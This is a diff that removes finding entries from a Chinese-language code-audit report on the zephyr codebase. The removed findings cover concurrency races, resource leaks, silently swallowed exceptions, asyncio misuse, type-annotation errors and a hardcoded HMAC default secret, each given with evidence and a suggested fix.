@@ -5027,12 +5027,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **问题**：客户端无法区分"用户无权限"与"操作需审批"
 - **修复**：新增ERR_SAFETY_APPROVAL_REQUIRED错误码
 
-#### 5.56.4 [MEDIUM] 事件队列满时静默丢弃，调用方无法区分成功与丢弃
-- **文件**：[event_bus.py](file:///D:/ZephyrAlpha/src/zephyr/shared/event_bus.py#L241)
-- **证据**：`if queue_depth >= self.max_queue_size: self._dropped_count += 1; return False`——返回False但调用方很少检查
-- **问题**：关键业务事件可能在背压时被丢弃，下游永远收不到
-- **修复**：事件丢弃时记录WARNING日志；HIGH优先级事件永不丢弃
-
 #### 5.56.5 [LOW] Self类型注解未导入且语义错误
 - **文件**：[outbox.py](file:///D:/ZephyrAlpha/src/zephyr/shared/infra/outbox.py#L95)
 - **证据**：`async def append(...) -> Self:`——Self未从typing导入；方法实际返回OutboxEntry不是Self
@@ -5053,12 +5047,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 ### 5.57 事件排序与因果一致性（7个，第14轮新增）
 
 > 维度说明：事件序列号、因果链、事件重放、DLQ集成等。（注：HookDispatcher._call_webhook为pass已在5.40.5记录，此处不重复）
-
-#### 5.57.1 [MEDIUM] 事件ID使用秒级时间戳，同一秒内碰撞
-- **文件**：[event_bus.py](file:///D:/ZephyrAlpha/src/zephyr/shared/event_bus.py#L110)
-- **证据**：`event_id=f"EV-{task_id}-{datetime.now(UTC).strftime('%Y%m%d-%H%M%S')}"`——秒级精度，同task同秒碰撞
-- **问题**：event_id不唯一；消费者用event_id做幂等去重时第二个事件被误判为重复
-- **修复**：使用uuid4或追加单调递增序号
 
 #### 5.57.2 [MEDIUM] 无单调序列号，消费者无法检测乱序
 - **文件**：[event_bus.py](file:///D:/ZephyrAlpha/src/zephyr/shared/event_bus.py#L108), [event_store.py](file:///D:/ZephyrAlpha/src/zephyr/governance/event_store.py#L162)
@@ -5320,12 +5308,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **证据**：`health_check`（L265获取/L301关闭）关闭在try块内但无finally。`schema_version()`（L288）或 `_db_path.stat()`（L292）抛非sqlite3.Error异常时，控制流跳到L327 `except Exception`，该分支不关闭conn→泄漏。`_wal_checkpoint`和`maintenance`同样无try/finally。
 - **修复**：所有连接获取后使用 `with` 或 try/finally 确保归还。
 
-#### 5.61.5 [MEDIUM] 连接池get_connection/return_connection无锁保护——并发竞态
-
-- **文件**：`src/zephyr/governance/database_manager.py:197-243`
-- **证据**：`_conn_pool` 为共享list，`get_connection`（L211-216）的 `if self._conn_pool:` + `self._conn_pool.pop()` 非原子，未获取 `self._lock`。两线程可同时通过if判断、同时pop()，导致 IndexError 或获取到同一连接。池耗尽时L214无限创建临时连接且不追踪。
-- **修复**：用锁保护连接池的获取/归还操作，设置max_overflow上限。
-
 #### 5.61.6 [LOW] event_store每次操作新建连接——无连接复用且PRAGMA重复执行
 
 - **文件**：`src/zephyr/infrastructure/event_store.py:136-181`
@@ -5380,12 +5362,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **文件**：`src/zephyr/governance/credential_rotation_trigger.py:63-94,96-103`
 - **证据**：类名为"CredentialRotationTrigger"，但 `scan_and_rotate`（L63）仅用正则扫描敏感文件中的凭据模式，`credentials_rotated` 硬编码为 `0`（L90）——从不执行任何轮换操作。整个系统不存在自动化密钥/凭据轮换机制：HMAC密钥均为静态硬编码，无轮换计划、无密钥版本管理、无key-id路由表。
 - **修复**：实现真正的轮换机制或重命名类为CredentialRotationDetector。
-
-#### 5.62.6 [MEDIUM] LLM网关裸os.getenv读取API密钥——绕过SecretProvider
-
-- **文件**：`src/zephyr/integration/llm_gateway.py:190,262`；规范声明于 `shared/security/secrets.py:38`
-- **证据**：secrets.py L38明确规定"任何API key/token/password MUST通过SecretProvider读取"。但llm_gateway.py L190 `api_key = os.getenv(config.api_key_env, "")` 和L262同模式，直接用 `os.getenv` 读取API密钥，绕过 `EnvSecretProvider` 的审计日志与脱敏机制。
-- **修复**：统一通过SecretProvider读取所有密钥。
 
 #### 5.62.7 [LOW] 无密钥派生函数——HMAC密钥为原始静态字符串
 
@@ -5484,12 +5460,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **文件**：`src/zephyr/governance/audit_trail/resource_aware_pool.py:46-47,56-58`
 - **证据**：`submit()` 每次append Future到 `_cpu_futures`/`_gpu_futures`，但任何地方都不删除已完成项。`stats()`（L74-77）遍历整个列表，随时间O(n)变慢且内存线性增长。
 - **修复**：定期清理已完成Future，或使用weakref。
-
-#### 5.65.2 [MEDIUM] CostTracker _records列表无界增长（视图截断非存储截断）
-
-- **文件**：`src/zephyr/integration/cost_tracker.py:62,82,120,139`
-- **证据**：`record_call()` 每次append（L82），`save_state()` 只取 `[-100:]` 导出（L139），但内存中 `_records` 列表本身永不收缩。`summary()`（L120）全表扫描 `by_model`，随记录数线性变慢。
-- **修复**：使用deque(maxlen=N)或在append时裁剪。
 
 #### 5.65.3 [HIGH] WorkOrchestrator _items字典无界增长（complete不删除）
 
@@ -5635,12 +5605,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 
 ### 5.68 异步取消与超时语义（4个，第15轮新增）
 
-#### 5.68.1 [HIGH] drift_engine超时后子进程未kill（孤儿进程）
-
-- **文件**：`src/zephyr/behavioral_audit/drift_engine.py:402-435`
-- **证据**：`asyncio.wait_for(proc.communicate(), timeout=...)` 超时后（L410），`TimeoutError` 被捕获（L427）仅返回事件，但 `proc`（asyncio子进程）从未 `kill()`/`terminate()`。`wait_for` 取消的是 `communicate()` 协程，子进程本身继续运行成为孤儿，持续占用资源。
-- **修复**：except块中 `proc.kill(); await proc.wait()`。
-
 #### 5.68.2 [HIGH] drift_detection/drift_engine同款子进程孤儿（副本）
 
 - **文件**：`src/zephyr/governance/drift_detection/drift_engine.py:299-317`
@@ -5677,12 +5641,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **证据**：`_execute_gate` 的 `except Exception: return True` — 当gate抛出任何异常（不存在、运行时错误、依赖缺失）时，返回True视为通过。这导致 `_run_gates` 中 `passed_gates += 1`，`failed_gates` 保持为0，最终 `result.success` 返回True。治理门禁完全失效且无任何告警。这是fail-open反模式在安全治理链路中的最严重体现。
 - **修复**：gate异常时返回False或重新抛出。
 
-#### 5.69.2 [MEDIUM] TaskQueue dispatch handler静默吞掉所有异常无日志
-
-- **文件**：`src/zephyr/trading/auto_runtime_core.py:267-281`
-- **证据**：`except Exception: pass` 完全无日志记录。任务分发失败（DB不可用、PipelineOrchestrator初始化失败、dispatch异常）时，调用者只收到 `False`，无法区分"任务不存在"和"分发过程崩溃"。失败任务既不记录也不进入DLQ，直接丢失。
-- **修复**：添加日志记录，失败任务进入DLQ。
-
 #### 5.69.3 [MEDIUM] WorkOrchestrator.load_dags静默跳过加载失败的DAG
 
 - **文件**：`src/zephyr/trading/work_orchestrator.py:68-80`
@@ -5713,23 +5671,11 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 
 ### 5.70 优雅降级与回退模式（4个，第15轮新增）
 
-#### 5.70.1 [MEDIUM] ResourceOptimizationEngine启动失败被静默吞掉（无降级标记）
-
-- **文件**：`src/zephyr/trading/auto_runtime_core.py:139-145`
-- **证据**：`except Exception: pass` 完全无日志。ResourceOptimizationEngine启动失败时，系统继续运行但资源压力监控、自愈、降级矩阵全部失效，且无任何告警或降级标记。与 `memory_writer.py` 的显式降级（返回 `status="degraded"`）形成对比——此处是静默降级。
-- **修复**：添加日志和降级标记。
-
 #### 5.70.2 [LOW] EscalationProtocol初始化失败仅debug级日志
 
 - **文件**：`src/zephyr/trading/auto_runtime_core.py:232-247`
 - **证据**：升级协议冷启动失败和EventBus订阅失败仅 `logger.debug`，生产环境默认日志级别（INFO/WARNING）下不可见。升级协议在未就绪状态下继续运行，但运维无感知。
 - **修复**：提升为warning级别。
-
-#### 5.70.3 [LOW] SpecEngine._discover模块名解析失败静默pass
-
-- **文件**：`src/zephyr/autonomy_core/engine.py:198-206`
-- **证据**：路径解析失败后 `module_name` 保持空字符串，后续 `_generate`、`_register` 流程继续执行，可能生成空名称的skill。无降级标记，无警告日志。
-- **修复**：解析失败时记录warning并跳过。
 
 #### 5.70.4 [MEDIUM] 多处except Exception: return False/None静默降级（无显式降级标记）
 
@@ -6109,12 +6055,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **证据**：`_ctx_allowance.set(token)` 返回的Token被丢弃，`revoke_allowance()` 用 `_ctx_allowance.set(None)` 而非 `_ctx_allowance.reset(token)`。嵌套 `with allow_llm_call():` 时，内层 `revoke` 把值设为None，外层 `with` 块内的LLM调用会被错误拦截（外层令牌被内层清理覆盖）。`allow_llm_call` 上下文管理器的 `finally: revoke_allowance()` 不是栈式恢复。
 - **修复**：保存token，revoke时用reset(token)。
 
-#### 5.80.4 [MEDIUM] SQLiteMetadataStore.close()仅关闭当前线程的连接，其他线程连接泄漏
-
-- **文件**：`src/zephyr/integration/vector_memory/sqlite_metadata_store.py:113-130,321-324`
-- **证据**：`_conn` property 在每个线程首次访问时创建该线程专属的sqlite3.Connection（因 `threading.local`），但 `close()` 只关闭调用线程的 `self._local.conn`。若该store被线程池多线程共享，其他线程的连接永不关闭，造成文件描述符泄漏与SQLite WAL文件锁残留。无 `__del__`、无atexit、无线程枚举清理机制。
-- **修复**：追踪所有线程的连接，close时全部关闭。
-
 #### 5.80.5 [MEDIUM] _tls放行令牌无线程退出清理，线程池复用泄漏令牌
 
 - **文件**：`src/zephyr/security/llm_defense/llm_security/runtime_interceptor.py:94-109`
@@ -6216,12 +6156,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **文件**：`src/zephyr/infrastructure/capacity_assurance/risk_mitigation.py:88-95`
 - **证据**：`ordered_lock_acquisition` 上下文管理器在 `__exit__` 中用 `self._locks.index(lock)` 找到锁并释放。若 `_locks` 列表中有重复的锁对象（同一Lock实例被add多次），`index()` 返回第一个匹配位置，后续重复锁永远不会被释放，造成死锁。`list.index` 返回的是第一个匹配，而非"当前应该释放的那个"。
 - **修复**：用计数器或栈结构追踪获取顺序，而非用 `list.index` 查找。
-
-#### 5.84.2 [LOW] get_market_read_conn contextmanager无try/finally
-
-- **文件**：`src/zephyr/governance/database_service.py:98-102`
-- **证据**：`@contextmanager` 装饰的 `get_market_read_conn` 在 `yield conn` 后无 `try/finally`。若消费者在 `with` 块内抛出异常，`yield` 之后的 `conn.close()` 不会执行（`@contextmanager` 在异常时不自动执行yield后的代码，除非有try/finally）。连接泄漏。但该函数可能被 `@contextmanager` 的默认行为部分保护（`@contextmanager` 会在GeneratorExit时执行finally），风险较低。
-- **修复**：包裹 `try: yield conn finally: conn.close()`。
 
 #### 5.84 严重度汇总
 
@@ -6436,16 +6370,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **文件**：`src/zephyr/reporting/analytics_base.py:66,89`
 - **证据**：同5.89.4模式。
 
-#### 5.89.7 [LOW] backtest_base.py _registry ClassVar dict（2副本）
-
-- **文件**：`src/zephyr/simulation/backtest_base.py:80` + `simulation/backtest_base_from_resear.py:80`
-- **证据**：同5.89.4模式，2份副本。
-
-#### 5.89.8 [LOW] signal_synthesizer.py + factor_base.py _registry ClassVar dict
-
-- **文件**：`src/zephyr/signal_fundamental/synth/signal_synthesizer.py:69` + `factor/factor_base.py:142`
-- **证据**：同5.89.4模式。
-
 #### 5.89 严重度汇总
 
 | 严重度 | 数量 | 编号 |
@@ -6496,12 +6420,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **文件**：`src/zephyr/trading/resource_optimization.py:132-139`
 - **证据**：与5.91.2相同模式。读取state不仅修改 `self._state`，还重置 `self._half_open_calls`。同类 `allow()` 方法（行141）也重复了这段转换逻辑。
 - **修复**：提取为私有方法 `_try_recover()`，仅在 `allow()` 中调用。
-
-#### 5.91.4 [MEDIUM] circuit_breaker.state getter调用_maybe_transition()
-
-- **文件**：`src/zephyr/ops/circuit_breaker.py:61-65`
-- **证据**：`@property def state(self)` 调用 `self._maybe_transition()`，方法名明确暗示会转换状态。同类 `call()` 方法（行67-72）也调用此方法。
-- **修复**：同5.91.2/5.91.3。
 
 #### 5.91 严重度汇总
 
@@ -6589,12 +6507,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **证据**：`__init__.py` 中定义了 `AppConfig` dataclass、`load_config()` 函数、`reload_config()` 函数、`_deep_merge_lists()` 函数。`__init__.py` 应仅做包初始化和重导出，不应定义业务类/函数。
 - **修复**：移到 `app_config.py` 子模块，`__init__.py` 仅做 `from .app_config import AppConfig` 重导出。
 
-#### 5.93.8 [MEDIUM] behavioral_audit/__init__.py 256条手动符号映射
-
-- **文件**：`src/zephyr/behavioral_audit/__init__.py:16-273,279-292,295-309`
-- **证据**：`_SYMBOL_SOURCE` 字典包含256条符号到子模块的映射，`__getattr__` 实现PEP 562懒加载。虽比5.93.3/5.93.4的做法好，但维护256条手动映射是脆弱的——新增符号时必须同步更新此字典。
-- **修复**：用自动化方式（如遍历子模块的 `__all__`）替代手动映射。
-
 #### 5.93 严重度汇总
 
 | 严重度 | 数量 | 编号 |
@@ -6629,21 +6541,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 | 5.94.16 | `autonomy_core/assembly/context_pipeline.py:93` | 模块级函数`build_pipeline() -> Self` | HIGH | 改为实际返回类型 |
 | 5.94.17-5.94.30 | `governance/audit_orchestration/`下`core/agent_orchestrator.py:562,711,715,732`、`state/session_manager.py:113,127,190,262`、`state/agent_health_monitor.py`、`state/file_task_mapper.py`、`resilience/hallucination_detector.py:441,458,495,556,735,767,801,885` | 上述trading/orchestrator所有问题的重复副本（SSoT违规），`-> Self`错误在同名文件同行全部复制存在 | HIGH | 消除governance/audit_orchestration重复代码，统一从trading/orchestrator引用 |
 
-#### 5.94.2 裸泛型类型（13个MEDIUM）
-
-| 编号 | file_path:line | 问题描述 | 严重度 | 修复建议 |
-|---|---|---|---|---|
-| 5.94.31 | `shared/event_bus.py:188,192` | 2处`handler: Callable`裸Callable无参数化 | MEDIUM | 改为`Callable[[Event], None]` |
-| 5.94.32 | `shared/event_bus.py:269` | `get_stats() -> dict`裸dict | MEDIUM | 改为`-> dict[str, int]` |
-| 5.94.33 | `shared/contract_bus.py:77,107` | 2处`data: dict -> dict`裸dict | MEDIUM | 参数化`dict[str, Any]` |
-| 5.94.34 | `governance/annotations.py:29,32,49,65` | 装饰器`-> Callable`裸Callable | MEDIUM | 用TypeVar参数化 |
-| 5.94.35 | `shared/foundation/deprecation.py:96,123` | 2处`-> Callable`裸Callable | MEDIUM | 用TypeVar实现类型保留 |
-| 5.94.36 | `governance/audit_schema.py:154` | `query_schema_drift() -> dict`裸dict | MEDIUM | 参数化 |
-| 5.94.37 | `infrastructure/event_store.py:87,105` | `to_row() -> tuple`裸tuple + `from_row(cls, row: dict)`裸dict | MEDIUM | 参数化 |
-| 5.94.38 | `shared/contracts/core/registry.py:345` | `get_stats() -> dict`裸dict | MEDIUM | 参数化 |
-| 5.94.39 | `governance/f5_boot_integration.py:279` | `last_periodic_result() -> dict`裸dict | MEDIUM | 参数化 |
-| 5.94.40 | `shared/evals.py:41` | dataclass字段`metadata: dict`裸dict | MEDIUM | 改为`dict[str, Any]` |
-
 #### 5.94.3 Any滥用掩盖已知类型（10个MEDIUM）
 
 | 编号 | file_path:line | 问题描述 | 严重度 | 修复建议 |
@@ -6656,16 +6553,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 | 5.94.46 | `governance/f5_boot_integration.py:263,267,271,275` | 4个引擎属性返回Any | MEDIUM | 改为具体引擎类型 |
 | 5.94.47 | `shared/session_continuity.py:247` | `generate_and_save() -> Any`实际返回Path或dict | MEDIUM | 改为`-> Path | dict[str, Any]` |
 | 5.94.48 | `trading/action_dispatcher.py:115` | `dispatch(self, task: Any)`参数过松 | MEDIUM | 定义Task Protocol |
-
-#### 5.94.4 公共API/构造器缺失返回注解（17个MEDIUM合并为11条）
-
-| 编号 | file_path:line | 问题描述 | 严重度 | 修复建议 |
-|---|---|---|---|---|
-| 5.94.49 | `trading/conductor.py:61,69` | `autopilot`/`repo`属性无返回注解 | MEDIUM | 补`-> AutoPilot`/`-> TaskRepository` |
-| 5.94.50 | `governance/database_service.py:62,99,105,144,176,182` | 6处`__init__`/contextmanager/方法缺`-> None`或返回注解 | MEDIUM | 补全返回注解 |
-| 5.94.51 | `infrastructure/event_store.py:127` | `__init__`缺`-> None` | MEDIUM | 补`-> None` |
-| 5.94.52 | `governance/depgraph_reader.py:74` | `__init__`缺`-> None` | MEDIUM | 补`-> None` |
-| 5.94.53 | `governance/rule_engine.py:88` | `__init__`缺`-> None` | MEDIUM | 补`-> None` |
 
 **严重度汇总**：
 
@@ -6887,27 +6774,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 | 5.100.6 | `integration/pipeline_orchestrator.py:1785-1793` | `_lsg_sanitize_output`中与5.100.5相同的死锁模式 | HIGH | 同上 |
 | 5.100.7 | `integration/pipeline_orchestrator.py:1842-1852` | `_lsg_scan_agent_action`中与5.100.5相同的死锁模式 | HIGH | 同上 |
 
-#### 5.100.2 MEDIUM级（9个）
-
-| 编号 | file_path:line | 问题描述 | 严重度 | 修复建议 |
-|---|---|---|---|---|
-| 5.100.8 | `shared/security/secrets.py:186,203-204` | `DotEnvSecretProvider.get_secret`（async def）调用同步方法`_load_env_file`，后者执行`with open(...)`阻塞文件IO | MEDIUM | 用`await asyncio.to_thread(...)`或aiofiles |
-| 5.100.9 | `infrastructure/_base_server.py:565-567` | `run_async`（async def）直接调用同步`handle_request(request)` + 阻塞`out.write()`/`out.flush()`。若tool handler执行阻塞IO会阻塞事件循环 | MEDIUM | 改为`await loop.run_in_executor(None, ...)` |
-| 5.100.10 | `integration/mcp/_base_server.py:565-567` | 与5.100.9完全相同（integration/mcp副本） | MEDIUM | 同上 |
-| 5.100.11 | `shared/infra/outbox.py:219` | `_poll_loop`（async def）同步调用`result = self._handler(entry)`。若handler是同步阻塞函数会阻塞事件循环 | MEDIUM | 统一要求handler为async或用`asyncio.to_thread` |
-| 5.100.12 | `shared/infra_06/outbox.py:219` | 与5.100.11完全相同（`_06`副本） | MEDIUM | 同上+消除重复 |
-| 5.100.13 | `trading/runtime/async_runtime.py:205-206` | `run_in_executor`（同步方法）执行`loop.run_in_executor(...)` + `asyncio.ensure_future(future).result()`。`.result()`阻塞当前线程，若从async上下文调用导致死锁 | MEDIUM | 加`if asyncio.get_running_loop(): raise RuntimeError`保护 |
-| 5.100.14 | `trading/runtime/async_runtime.py:171` | `run_coroutine`当`self._loop`存在且未运行时仍调用`asyncio.run(coro)`，创建新loop导致`self._loop`成为孤儿 | MEDIUM | 用`self._loop.run_until_complete(coro)` |
-| 5.100.15 | 12+文件：`autonomy_core/llm_gateway.py:74,103`、`integration/llm_gateway.py`、`infrastructure/pipeline/llm_gateway.py`、`infrastructure/gateway_server.py:107`、`integration/mcp/gateway_server.py:107`、`infrastructure/a2a_protocol/`3个adapter、`governance/default_security_gateway.py:278`（+compliance_gate_a6副本）、`trading/orchestrator/agent_orchestrator.py:911`（+audit_orchestration副本） | 多处fallback路径使用`asyncio.get_event_loop()`。Python 3.10+中当无运行loop时该API已弃用，3.12+发出DeprecationWarning | MEDIUM | 改用`asyncio.new_event_loop()` + `set_event_loop()` + `run_until_complete()` + `close()` |
-| 5.100.16 | 12+文件：`ops/evolution_engine.py:351`、`ops/scheduler.py:298`、`autonomy_core/context_injector.py:261`、`autonomy_core/llm_gateway.py:69,96`、`infrastructure/governance_server.py:575`、`infrastructure/gateway_server.py:95`、`infrastructure/_base_server.py:527`、`infrastructure/a2a_protocol/legacy_governance_adapter.py:70` | 多处同步函数中调用`asyncio.run(...)`桥接async代码。`asyncio.run`每次创建并销毁新loop，频繁调用开销大且无法复用loop-bound资源（Lock/Queue绑定到首次创建的loop） | MEDIUM | 对高频路径用`AsyncRuntime.run_coroutine`复用loop |
-
-#### 5.100.3 LOW级（2个）
-
-| 编号 | file_path:line | 问题描述 | 严重度 | 修复建议 |
-|---|---|---|---|---|
-| 5.100.17 | `trading/runtime/async_runtime.py:108` | `AsyncRuntime.start`调用`asyncio.new_event_loop()`但未调用`asyncio.set_event_loop(loop)`，后续`asyncio.get_event_loop()`可能返回不同loop | LOW | 补`asyncio.set_event_loop(self._loop)` |
-| 5.100.18 | `behavioral_audit/__main__.py:60-66` + `governance/audit_trail/cli.py:180-183` + `governance/audit_orchestration/cli.py:180-183` + `behavioral_audit/cold_start.py:247-252` + `governance/drift_detection/cold_start.py:154-162` | 5处CLI/冷启动入口使用`new_event_loop() + set_event_loop() + ... + close()`模式但未保存/恢复之前的loop | LOW | 保存原loop并在finally中恢复；或直接用`asyncio.run(...)` |
-
 **严重度汇总**：
 
 | 严重度 | 数量 | 编号 |
@@ -7019,38 +6885,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 | 5.104.9-5.104.11 | `governance/compliance_gate_a6/default_security_gateway.py:166,202,233` | 上述3个问题的重复副本 | HIGH | 删除重复文件，改为重导出 |
 | 5.104.12 | `governance/adapters/simulation_broker.py:117` | `cancel_order(self, order_id: str)` 参数名`order_id`应为ABC定义的`broker_order_id`，关键字调用会TypeError | HIGH | 改参数名为`broker_order_id` |
 | 5.104.13 | `governance/adapters/simulation_broker.py:125` | `query_order(self, order_id: str)` 同上参数名不匹配 | HIGH | 同上 |
-
-#### 5.104.2 ABC定义但实现类不继承（6个MEDIUM）
-
-| 编号 | file_path:line | 问题描述 | 严重度 | 修复建议 |
-|---|---|---|---|---|
-| 5.104.14 | `governance/audit_trail/indexer.py:30` | `class AuditIndexer:` 不继承`AuditIndexer(ABC)`，类名相同但无继承关系 | MEDIUM | 改为`class AuditIndexer(AuditIndexerABC):` |
-| 5.104.15 | `governance/audit_trail/writer.py:33` | `class AuditReportWriter:` 不继承`AuditWriter(ABC)` | MEDIUM | 改为继承ABC |
-| 5.104.16 | `governance/audit_trail/query.py:32` | `class AuditQueryEngine:` 不继承`AuditQuery(ABC)` | MEDIUM | 改为继承ABC |
-| 5.104.17 | `governance/audit_orchestrator/indexer.py:30` | 同样不继承ABC（重复） | MEDIUM | 同上 |
-| 5.104.18 | `governance/audit_orchestrator/contracts.py:43-86` | 与`audit_trail/contracts.py`完全重复定义5个ABC（违反SSoT） | MEDIUM | 删除重复，改为重导出 |
-| 5.104.19 | `governance/audit_trail/indexer.py:30` | `AuditIndexer` ABC声明了`cold_start_cache()`但实现类未提供 | MEDIUM | 补全实现或从ABC降级 |
-
-#### 5.104.3 Phase-B骨架ABC无实现（14个LOW）
-
-约17个ABC作为OCP扩展点声明，无任何具体实现类。可能是Phase B skeleton预留：
-
-| 编号 | 代表性file_path | ABC名称 | 严重度 |
-|---|---|---|---|
-| 5.104.20 | `security/llm_defense/llm_security/protocol.py:43` | `LLMSecurityProtocol`（3个抽象方法） | LOW |
-| 5.104.21 | `governance/compliance_manager.py:46` | `ComplianceManagerBase`（4个抽象方法） | LOW |
-| 5.104.22 | `risk/risk_manager.py:51` | `RiskManagerBase`（3个抽象方法） | LOW |
-| 5.104.23 | `risk/risk_validator.py` | `RiskValidator` | LOW |
-| 5.104.24 | `risk/risk_limits.py` | `RiskLimitsCalculator` | LOW |
-| 5.104.25 | `integration/vector_memory/interface.py:71` | `EmbeddingEngineBase` | LOW |
-| 5.104.26 | `ml_train/trainer_base.py` | `TrainerBase` | LOW |
-| 5.104.27 | `ml_train/inference_base.py` | `InferenceBase` | LOW |
-| 5.104.28 | `frontend/interface_base.py` | `DashboardBase`/`NotificationManagerBase`/`ApprovalGatewayBase` | LOW |
-| 5.104.29 | `infra_ops/interface_base.py` | 同上3个ABC（重复定义） | LOW |
-| 5.104.30 | `infrastructure/infrastructure_base.py:56,81,110` | `InfrastructureManagerBase`/`ConfigManagerBase`/`KillSwitchManagerBase` | LOW |
-| 5.104.31 | `signal_fundamental/gen/aggregator_base.py:100` | `DegradationMonitorBase` | LOW |
-| 5.104.32 | `signal_fundamental/synth/signal_synthesizer.py:54` | `SignalSynthesizerBase` | LOW |
-| 5.104.33 | `simulation/pipeline_base.py:100` | `ScoutAgentBase` | LOW |
 
 **严重度汇总**：HIGH=13, MEDIUM=6, LOW=14, 合计=33
 
@@ -7183,12 +7017,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **问题**：`__repr__`返回值不是合法Python表达式，违反PEP 257"应返回可重建对象表达式"约定。
 - **修复**：统一为`f"ClassName(field={self.field!r}, ...)"`格式。
 
-#### 5.110.8 [LOW] EscalationAPI持有_api_keys字典却无__repr__
-
-- **文件**：`src/zephyr/governance/escalation_api.py:35-44`
-- **问题**：持有多个service的api_key映射，无`__repr__`，调试时无法快速查看已注册服务列表。存在latent泄露风险。
-- **修复**：`def __repr__(self): return f"EscalationAPI(services={list(self._api_keys.keys())})"`
-
 #### 5.110.9 [LOW] IdentityVerifier持有_secret却无__repr__
 
 - **文件**：`src/zephyr/infrastructure/a2a_protocol/layer1_discovery/identity_verifier.py:24-28`
@@ -7244,12 +7072,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
   - `src/zephyr/governance/behavioral_admission/gpu_consensus_scheduler.py:295-308`
 - **问题**：`gather(*tasks, return_exceptions=True)`在子任务被取消时将`CancelledError`作为结果返回。后续`isinstance(r, Exception)`对`CancelledError`返回`False`（Python 3.8+中`CancelledError`继承`BaseException`而非`Exception`）。被取消的子任务结果静默丢弃或进入`elif r is not None`分支调用`r.get("verdict")`抛`AttributeError`。
 - **修复**：改用`isinstance(r, BaseException)`，`CancelledError`单独`raise`传播取消信号。
-
-#### 5.112.3 [MEDIUM] 线程runner except Exception未捕获CancelledError致future永久挂起
-
-- **文件**：`src/zephyr/behavioral_audit/brain_integration.py:224-244`
-- **问题**：`_run_async`在已有事件循环时通过新线程运行协程。线程函数`_runner`用`except Exception`捕获异常回填future，但`CancelledError`是`BaseException`不被捕获，`future.set_exception(exc)`被跳过，future永不resolve。调用方`future.result()`**永久阻塞**。
-- **修复**：改用`except BaseException`，或在`finally`中确保`if not future.done(): future.set_exception(exc)`。
 
 **严重度汇总**：HIGH=1, MEDIUM=2, LOW=0, 合计=3
 
@@ -7354,12 +7176,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **文件**：同5.116.2的5个文件
 - **问题**：`__init_subclass__`中`hasattr(cls, "__xxx_id__")`会沿MRO查找继承属性。若未来出现二级子类未重定义`__xxx_id__`，会以继承的父类id**覆盖**父类注册。当前仅有直接子类，故为潜在bug，但一旦有人扩展二级子类即触发。
 - **修复**：将`hasattr(cls, "__xxx_id__")`改为`"__xxx_id__" in cls.__dict__`，只注册在自身类体中定义了id的类。
-
-#### 5.116.4 [LOW] 文档引用不存在的DataSourceRegistry类
-
-- **文件**：`src/zephyr/governance/alt_data_connector/provider_base.py:82`（+`governance/provider_base.py:82`重复副本）
-- **问题**：`DataSourceBase`类文档字符串指引开发者使用`@DataSourceRegistry.register`装饰器注册，但`DataSourceRegistry`类在代码库中**不存在**。实际注册由`__init_subclass__`自动完成。文档与代码矛盾，会误导新增数据源的实现者。
-- **修复**：将文档改为"设置类属性`__meta__ = DataSourceMeta(...)`即自动注册"。
 
 #### 5.116.5 [LOW] _base_server.py文档误导——建议在__init_subclass__中调用实例方法
 
@@ -7658,12 +7474,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **问题**：`os.open()`返回fd后，`os.write(fd, ...)`若抛`OSError`（磁盘满/配额超限），`os.close(fd)`不会执行，`except`直接return，fd泄漏。`skill_locking.py`的`os.close(fd)`位于`yield`的finally块，但`os.write`异常时永远到达不了try/finally块。
 - **修复**：将`os.write`/`os.close`包入`try/finally`。两份`rollback_lock.py`为重复实现，应统一。
 
-#### 5.128.4 [LOW] safe_open返回裸句柄设计缺陷
-
-- **文件**：`src/zephyr/infrastructure/capacity_assurance/modules/winfs_defense.py:51`
-- **问题**：`safe_open()`返回裸`open()`句柄，调用方必须自行`close()`。当前零调用方，属潜在脚枪。
-- **修复**：改为`@contextmanager`或标记deprecated。
-
 **严重度汇总**：HIGH=3, MEDIUM=8, LOW=1, 合计=12
 
 ---
@@ -7703,12 +7513,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 ---
 
 ### 5.130 硬编码凭据（3个，第23轮新增）
-
-#### 5.130.1 [HIGH] cross_session_detector的_DEFAULT_SECRET硬编码HMAC签名密钥
-
-- **文件**：`src/zephyr/security/access_control/cross_session_detector.py:34`
-- **问题**：模块级`_DEFAULT_SECRET = "zeph***"`硬编码默认密钥，在`__init__`中作为`secret_key`缺省回退值直接用于agent session token的HMAC-SHA256签名与验签。文件标注`[MATURITY] production`、`[DOMAIN] D_SECURITY`，属生产路径代码。若部署时未显式注入`secret_key`（默认调用路径），所有签名使用此公开可知的固定值，攻击者可伪造合法session token签名，绕过跨session盗用检测。
